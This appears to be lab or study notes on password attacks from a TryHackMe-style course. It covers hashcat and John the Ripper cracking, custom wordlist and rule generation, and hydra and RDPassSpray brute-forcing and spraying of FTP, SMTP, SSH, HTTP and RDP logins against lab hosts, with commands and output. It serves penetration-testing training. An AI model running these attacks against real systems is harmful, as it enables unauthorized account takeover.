# Password Cracking vs. Password Guessing

The password cracking is an "offline" technique. The attacker may obtain the encrypted password form a compromise computer system or capture from transmitting data over the network. Once the password are obtained the attackers can utilize password attaccking techniques to crack these password using various tools as hashcat or john the riper

The password guessing is an "online" techniques because use protocols and service to communicate directly with the target. This techniques are considerate time consumed and provides much log at the target, furthermore if the target is a web-based application if correctly set we are block after several attempts.





# Default Passwords  

Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers don't change the default password, which makes the system vulnerable. Thus, it is a good practice to try out admin:admin, admin:123456, etc. If we know the target device, we can look up the default passwords and try them out. For example, suppose the target server is a Tomcat, a lightweight, open-source Java application server. In that case, there are a couple of possible default passwords we can try: admin:admin or tomcat:admin.

Here are some website lists that provide default passwords for various products.

- [](https://cirt.net/passwords)[https://cirt.net/passwords](https://cirt.net/passwords)
- [](https://default-password.info/)[https://default-password.info/](https://default-password.info/)
- [](https://datarecovery.com/rd/default-passwords/)[https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)

# Weak Passwords  
Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Here are some of the common weak passwords lists :

- [https://wiki.skullsecurity.org/index.php?title=Passwords](https://wiki.skullsecurity.org/index.php?title=Passwords)[](https://wiki.skullsecurity.org/index.php?title=Passwords) - This includes the most well-known collections of passwords.
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) - A huge collection of all kinds of lists, not only for password cracking.

# Leaked Passwords

Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as 'dumps'. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. The following are some of the common password lists that have weak and leaked passwords, including webhost, elitehacker,hak5, Hotmail, PhpBB companies' leaks:  

- [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)

# Combined wordlists  

Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using cat:

```shell-session
cat file1.txt file2.txt file3.txt > combined_list.txt
```

To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows:

```shell-session
sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```

# Customized Wordlists  

Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a company's website contains valuable information about the company and its employees, including emails and employee names. In addition, the website may contain keywords specific to what the company offers, including product and service names, which may be used in an employee's password!   

Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below:

```shell-session
user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs
```

-w will write the contents to a file. In this case, list.txt.

-m 5 gathers strings (words) that are 5 characters or more

-d 5 is the depth level of web crawling/spidering (default 2)

http://thm.labs is the URL that will be used

As a result, we should now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames. 

Apply what we discuss using cewl against https://clinic.thmredteam.com/ to parse all words and generate a wordlist with a minimum length of 8. Note that we will be using this wordlist later on with another task!

# Username Wordlists

Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a {first name} {last name} (ex: John Smith) and a method of generating usernames.

- **{first name}:** john
- **{last name}:** smith
- **{first name}{last name}:  johnsmith** 
- **{last name}{first name}:  smithjohn**  
- first letter of the **{first name}{last name}: jsmith** 
- first letter of the **{last name}{first name}: sjohn**  
- first letter of the **{first name}.{last name}: j.smith** 
- first letter of the **{first name}-{last name}: j-smith** 
- and so on

Thankfully, there is a tool username_generator that could help create a list with most of the possible combinations if we have a first name and last name.

```shell-session
user@thm$ git clone https://github.com/therodri2/username_generator.git
Cloning into 'username_generator'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.

user@thm$ cd username_generator
```

Using python3 username_generator.py -h shows the tool's help message and optional arguments.

```shell-session
user@thm$ python3 username_generator.py -h
usage: username_generator.py [-h] -w wordlist [-u]

Python script to generate user lists for bruteforcing!

optional arguments:
  -h, --help            show this help message and exit
  -w wordlist, --wordlist wordlist
                        Specify path to the wordlist
  -u, --uppercase       Also produce uppercase permutations. Disabled by default
```

Now let's create a wordlist that contains the full name John Smith to a text file. Then, we'll run the tool to generate the possible combinations of the given full name.

```shell-session
user@thm$ echo "John Smith" > users.lst
user@thm$ python3 username_generator.py -w users.lst
usage: username_generator.py [-h] -w wordlist [-u]
john
smith
j.smith
j-smith
j_smith
j+smith
jsmith
smithjohn
```

# Dictionary attack

A dictionary attack is a technique used to guess passwords by using well-known words or phrases. The dictionary attack relies entirely on pre-gathered wordlists that were previously generated or found. It is important to choose or create the best candidate wordlist for your target in order to succeed in this attack. Let's explore performing a dictionary attack using what you've learned in the previous tasks about generating wordlists. We will showcase an offline dictionary attack using hashcat, which is a popular tool to crack hashes.  

Let's say that we obtain the following hash f806fc5a2a0d5ba2471600758452799c, and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum:  

1- What type of hash is this?  
2- What wordlist will we be using? Or what type of attack mode could we use?

To identify the type of hash, we could a tool such as hashid or hash-identifier. For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU).

```shell-session
user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
f806fc5a2a0d5ba2471600758452799c:rockyou

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: f806fc5a2a0d5ba2471600758452799c
Time.Started.....: Mon Oct 11 08:20:50 2021 (0 secs)
Time.Estimated...: Mon Oct 11 08:20:50 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40/40 (100.00%)
Rejected.........: 0/40 (0.00%)
Restore.Point....: 0/40 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> 123123

Started: Mon Oct 11 08:20:49 2021
Stopped: Mon Oct 11 08:20:52 2021
```

- -a 0  sets the attack mode to a dictionary attack

- -m 0  sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes.

f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes.

/usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack

We run hashcat with --show option to show the cracked value if the hash has been cracked:

```shell-session
user@machine$ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show
f806fc5a2a0d5ba2471600758452799c:rockyou
```

As a result, the cracked value is rockyou.

# Brute-Force attack

Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords.

In contrast, a brute-force attack aims to try all combinations of a character or characters. For example, let's assume that we have a bank account to which we need unauthorized access. We know that the PIN contains 4 digits as a password. We can perform a brute-force attack that starts from 0000 to 9999 to guess the valid PIN based on this knowledge. In other cases, a sequence of numbers or letters can be added to existing words in a list, such as admin0, admin1, .. admin9999.

For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options.

```shell-session
user@machine$ hashcat --help
 ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
  d | 0123456789
  h | 0123456789abcdef
  H | 0123456789ABCDEF
  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff
```

The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice. 

```shell-session
user@machine$ hashcat -a 3 ?d?d?d?d --stdout
1234
0234
2234
3234
9234
4234
5234
8234
7234
6234
..
..
```

- -a 3  sets the attacking mode as a brute-force attack

- ?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999

- --stdout print the result to the terminal

Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number.

```shell-session
user@machine$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
05a5cf06982ba7892ed2a6d38fe832d6:2021

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 05a5cf06982ba7892ed2a6d38fe832d6
Time.Started.....: Mon Oct 11 10:54:06 2021 (0 secs)
Time.Estimated...: Mon Oct 11 10:54:06 2021 (0 secs)
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
Candidates.#1....: 1234 -> 6764

Started: Mon Oct 11 10:54:05 2021
Stopped: Mon Oct 11 10:54:08 2021
```

### Rule-Based attacks

Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy — for example, manipulating or 'mangling' a password such as 'password': `p@ssword, Pa$$word, Passw0rd, and so on`.

For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules:

Rule-based attack

```shell-session
user@machine$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
JumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
Jumbo
KoreLogic
T9
```

We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string tryhackme, to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do!

Rule-based attack

```shell-session
user@machine$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
76p 0:00:00:00 100.00% (2021-10-11 13:42) 1266p/s pordpo
76
```

--wordlist= to specify the wordlist or dictionary file. 

--rules to specify which rule or rules to use.

--stdout to print the output to the terminal.

|wc -l  to count how many lines John produced.

By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic. KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website [here](https://contest-2010.korelogic.com/rules.html). Now let's use this rule and check whether the Tryh@ckm3 is available in our list!

```shell-session
user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
Tryh@ckm3
7089833p 0:00:00:02 100.00% (2021-10-11 13:56) 3016Kp/s tryhackme999999
```

The output from the previous command shows that our list has the complex version of tryhackme, which is Tryh@ckm3. Finally, we recommend checking out all the rules and finding one that works the best for you. Many rules apply combinations to an existing wordlist and expand the wordlist to increase the chance of finding a valid password!

### Custom Rules

John the ripper has a lot to offer. For instance, we can build our own rule(s) and use it at run time while john is cracking the hash or use the rule to build a custom wordlist!

Let's say we wanted to create a custom wordlist from a pre-existing dictionary with custom modification to the original dictionary. The goal is to add special characters (ex: !@#$*&) to the beginning of each word and add numbers 0-9 at the end. The format will be as follows:

[symbols]word[0-9]

We can add our rule to the end of john.conf:

John Rules

```shell-session
user@machine$ sudo vi /etc/john/john.conf 
[List.Rules:THM-Password-Attacks] 
Az"[0-9]" ^[!@#$]
```

[List.Rules:THM-Password-Attacks]  specify the rule name THM-Password-Attacks.

Az represents a single word from the original wordlist/dictionary using -p.

- "[0-9]" append a single digit (from 0 to 9) to the end of the word. For two digits, we can add "[0-9][0-9]"  and so on.  

- ^[!@#$] add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.

Now let's create a file containing a single word password to see how we can expand our wordlist using this rule.

John Rules

```shell-session
user@machine$ echo "password" > /tmp/single.lst
```

We include the name of the rule we created in the John command using the --rules option. We also need to show the result in the terminal. We can do this by using --stdout as follows:

John Rules

```shell-session
user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
Using default input encoding: UTF-8 
!password0 
@password0 
#password0 
$password0
```

Now it's practice time to create your own rule.




Online password attacks involve guessing passwords for networked services that use a username and password authentication scheme, including services such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc. This section showcases using hydra which is a common tool used in attacking logins for various network services.  

# Hydra

Hydra supports an extensive list of network services to attack. Using hydra, we'll brute-force network services such as web login pages, FTP, SMTP, and SSH in this section. Often, within hydra, each service has its own options and the syntax hydra expects takes getting used to. It's important to check the help options for more information and features.  

## FTP  

In the following scenario, we will perform a brute-force attack against an FTP server. By checking the hydra help options, we know the syntax of attacking the FTP server is as follows:


```shell-session
user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

-l ftp we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

Remember that sometimes you don't need to brute-force and could first try default credentials. Try to attack the FTP server on the attached VM and answer the question below.

## SMTP  

Similar to FTP servers, we can also brute-force SMTP servers using hydra. The syntax is similar to the previous example. The only difference is the targeted protocol. Keep in mind, if you want to try other online password attack tools, you may need to specify the port number, which is 25. Make sure to read the help options of the tool.


```shell-session
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

  

## SSH  

SSH brute-forcing can be common if your server is accessible to the Internet. Hydra supports many protocols, including SSH. We can use the previous syntax to perform our attack! It's important to notice that password attacks rely on having an excellent wordlist to increase your chances of finding a valid username and password.


```shell-session
user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

## HTTP login pages

In this scenario, we will brute-force HTTP login pages. To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST. Checking hydra options: hydra http-get-form -U, we can see that hydra has the following syntax for the http-get-form option:

`<url>:<form parameters>:<condition string>[:<optional>[:<optional>]`

As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite.

```shell-session
user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php 
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
1 of 1 target successfully completed, 1 valid password found 
Hydra (http://www.thc.org/thc-hydra) 
finished at 2021-10-13 08:06:45
```

-l admin  we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

10.10.x.x the IP address or the fully qualified domain name (FQDN) of the target.

http-get-form the type of HTTP request, which can be either http-get-form or http-post-form.

Next, we specify the URL, path, and conditions that are split using :

login-get/index.php the path of the login page on the target webserver.

username=^USER^&password=^PASS^ the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.

The following section is important to eliminate false positives by specifying the 'failed' condition with F=.

And success conditions, S=. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage 'Invalid password' after a failed login, set F=Invalid Password.

Or for example, during the enumeration, we found that the webserver serves logout.php. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request.

S=logout.php the success condition to identify the valid credentials

-f to stop the brute-forcing attacks after finding a valid username and password

You can try it out on the attached VM by visiting http://10.10.15.118/login-get/index.php. Make sure to deploy the attached VM if you haven't already to answer the questions below.

Finally, it is worth it to check other online password attacks tools to expand your knowledge, such as:  

- Medusa
- Ncrack
- others!

# Password Spray Attack

This task will teach the fundamentals of a password spraying attack and the tools needed to perform various attack scenarios against common online services.

Password Spraying is an effective technique used to identify valid credentials. Nowadays, password spraying is considered one of the common password attacks for discovering weak passwords. This technique can be used against various online services and authentication systems, such as SSH, SMB, RDP, SMTP, Outlook Web Application, etc. A brute-force attack targets a specific username to try many weak and predictable passwords. While a password spraying attack targets many usernames using one common weak password, which could help avoid an account lockout policy. The following figure explains the concept of password spraying attacks where the attacker utilizes one common password against multiple users.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/17bdbbc66c5924d99823be70e98832ed.png)  

Common and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format can be found below.

- The current season followed by the current year (SeasonYear). For example, **Fall2020**, **Spring2021**, etc.
- The current month followed by the current year (MonthYear). For example, **November2020**, **March2021**, etc.
- Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.  
    

If a password complexity policy is enforced within the organization, we may need to create a password that includes symbols to fulfill the requirement, such as October2021!, Spring2021!, October2021@, etc. **To be successful in the password spraying attack, we need to enumerate the target and create a list of valid usernames (or email addresses list)**.

Next, we will apply the password spraying technique using different scenarios against various services, including:

- SSH
- RDP
- Outlook web access (OWA) portal  
    
- SMB

### SSH

Assume that we have already enumerated the system and created a valid username list.

Hashcat

```shell-session
user@THM:~# cat usernames-list.txt
admin
victim
dummy
adm
sammy
```

Here we can use hydra to perform the password spraying attack against the SSH service using the Spring2021 password.

Hashcat

```shell-session
user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.

### RDP

Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to password spray against RDP. First, install the tool on your attacking machine by following the installation instructions in the tool’s GitHub repo. As a new user of this tool, we will start by executing the python3 RDPassSpray.py -h command to see how the tools can be used:

Hashcat

```shell-session
user@THM:~# python3 RDPassSpray.py -h
usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Target machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts
```

Now, let's try using the (-u) option to specify the victim as a username and the (-p) option set the Spring2021!. The (-t) option is to select a single host to attack.

Hashcat

```shell-session
user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
```

The above output shows that we successfully found valid credentials victim:Spring2021!. Note that we can specify a domain name using the -d option if we are in an Active Directory environment.

Hashcat

```shell-session
user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```

There are various tools that perform a spraying password attack against different services, such as:

### Outlook web access (OWA) portal  

Tools:

- [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) (atomizer.py)
- [MailSniper](https://github.com/dafthack/MailSniper)

### SMB

- Tool: Metasploit (auxiliary/scanner/smb/smb_login)